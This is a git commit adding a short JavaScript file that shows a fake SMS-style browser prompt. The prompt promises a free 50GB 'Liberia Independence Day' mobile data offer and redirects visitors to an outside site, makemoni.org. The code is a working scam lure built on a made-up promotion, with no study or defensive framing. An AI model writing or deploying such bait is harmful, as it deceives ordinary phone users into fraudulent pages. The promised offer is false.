588362f5fc24c1c87373f5e955d910ba9498d1c4
bestplugg <nsiukpe247@gmail.com>
2025-07-11 22:04:03 +0100

    Create liberia-active.js

---
+++ liberia-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 50gb Liberia Independence Day celebration offer, Press Ok to activate Now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://makemoni.org/liberia.html';
+}
